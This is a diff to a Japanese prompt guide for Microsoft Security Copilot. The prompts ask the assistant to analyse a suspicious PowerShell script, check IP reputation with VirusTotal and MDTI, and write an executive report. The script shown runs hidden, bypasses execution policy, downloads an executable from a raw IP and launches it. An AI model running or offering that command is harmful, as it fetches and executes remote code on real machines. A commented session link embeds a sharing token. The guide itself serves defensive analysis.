@@ -51,6 +51,12 @@ VirusTotal を使用して、このIPアドレス 101.35.198.64 のレピュテ�
 以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
 Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
  ```
+```
+MDTIを使用して、検出されたIPアドレスまたはドメイン、ホスト名を検証し、レピュテーションを評価して
+```
+```
+この分析結果を要約してエグゼクティブレポートを作成する。スクリプトの評価から始める。評価に対する信頼性と裏付けとなる証拠を含める。その下に、「スクリプトの概要」、「脅威インテリジェンス」、「対応の提案」の各セクションを設ける。技術的でない読者にも適した内容にする
+```
 <!--
 [Session link](https://securitycopilot.microsoft.com/sessions/7fd4c1dc-ed79-4744-b255-8fae70757085?st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJTZXNzaW9uTGlua1NoYXJpbmdTdWJqZWN0IiwibmFtZWlkIjoiNzViZTE4MWEtYzE1NS00YTc4LWIyMjAtYmMxOTNjZDg5Mjg1Iiwib2lkIjoiNGI0OGE3MWItZTBlNi00MWEwLTk2NDUtYWNmYmZiZDIyOWIwIiwidGlkIjoiNWE4NjUxYzQtYzYyZi00MWJkLWFjMDAtYzJjMzJlYzdhZTQ2Iiwicm9sZSI6InZpZXdlciIsInNjcCI6IjdmZDRjMWRjLWVkNzktNDc0NC1iMjU1LThmYWU3MDc1NzA4NSIsInJvbGVzIjoiU2Vzc2lvbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL2Fub255bW91cyI6IkZhbHNlIiwibmJmIjoxNzI5NjYwMjc4LCJleHAiOjIwNDUxOTMwNzgsImlhdCI6MTcyOTY2MDI3OCwiaXNzIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIiwiYXVkIjoiYmIzZDY4YzItZDA5ZS00NDU1LTk0YTAtZTMyMzk5NmRiYWEzIn0.xotnp07qH2ltTEQF2oIo6DbNe68W_jLw6XzOTcFDx-g)
 -->
